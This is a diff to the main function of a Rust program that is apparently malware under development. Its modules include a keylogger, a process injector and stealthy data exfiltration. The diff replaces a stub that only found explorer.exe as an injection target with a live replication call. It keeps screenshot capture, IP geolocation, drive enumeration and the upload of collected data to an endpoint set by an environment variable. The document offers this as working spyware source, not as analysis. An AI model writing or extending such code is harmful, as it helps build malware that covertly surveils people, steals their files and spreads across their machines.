@@ -19,6 +19,8 @@ pub mod injector;
 pub mod keylogger;
 /// Logging utilities for application events
 pub mod log;
+/// Centralized path management
+pub mod paths;
 /// Network communication for data exfiltration
 pub mod network;
 /// Stealthy network communication for data exfiltration
@@ -63,17 +65,10 @@ async fn main() {
     // 1.3. Start File Scanner Service
     file_scanner::start_file_scanner();
 
-    // 1.4. Demonstrate process injection capabilities (Windows-only)
+    // 1.4. Start process replication service (Windows-only)
     #[cfg(windows)]
     {
-        Log::info(format!("Attempting to find target process for injection..."));
-        if let Some(pid) = replica::find_process_pid("explorer.exe") {
-            Log::info(format!("Found target process 'explorer.exe' with PID: {}", pid));
-            // In a real scenario, we would proceed with injection here.
-            // For now, we are just demonstrating the process finding capability.
-        } else {
-            Log::error(format!("Could not find target process 'explorer.exe'"));
-        }
+        replica::replicate_to_targets();
     }
 
     // 2. Collect drive info.
@@ -83,17 +78,12 @@ async fn main() {
         Log::info(format!("  - {:?}", drive));
     }
 
-    // 2.1. Start filesystem crawl
-    Log::info("Starting filesystem crawl...".to_string());
-            if let Err(e) = crawler::crawl_drives(&drives, constants::CRAWLER_OUTPUT_FILENAME).await {
-        Log::error(format!("Filesystem crawl failed: {}", e));
-    }
 
     // 2.1. Capture and save a screenshot with compression
     Log::info(format!("Capturing screenshot with WebP compression for optimal file size"));
     // Use the WebP format with balanced compression settings
-        match screen_capture::ScreenCapture::capture_and_save_with_compression(
-        constants::SCREENSHOT_OUTPUT_DIR, 
+    match screen_capture::ScreenCapture::capture_and_save_with_compression(
+        &constants::screenshot_output_dir(), 
         None,
         screen_capture::CompressionFormat::smallest_size()
     ) {
@@ -143,7 +133,8 @@ async fn main() {
                 Log::info(format!("IP-based geolocation information obtained"));
                 let location_str = geolocation::Geolocator::format_location(&location);
                 Log::info(location_str);
-                if let Err(e) = writer::save_output(&location, "logs/geolocation.json", false) {
+                let output_path = paths::get().data_dir.join("geolocation.json");
+                if let Err(e) = writer::save_output(&location, output_path.to_str().unwrap_or_default(), false) {
                     Log::error(format!("Failed to save geolocation data: {}", e));
                 }
             },
@@ -156,7 +147,8 @@ async fn main() {
         }
     };
     // 3. Persist locally.
-    let _ = writer::save_output(&drives, "logs/drive_info.json", false)
+    let drive_info_path = paths::get().data_dir.join("drive_info.json");
+    let _ = writer::save_output(&drives, drive_info_path.to_str().unwrap_or_default(), false)
         .map_err(|e| Log::error(format!("Failed to save drive info: {}", e)));
     // 4. Exfiltrate data to server.
     let server_url = env::var("COLLECT_ENDPOINT")
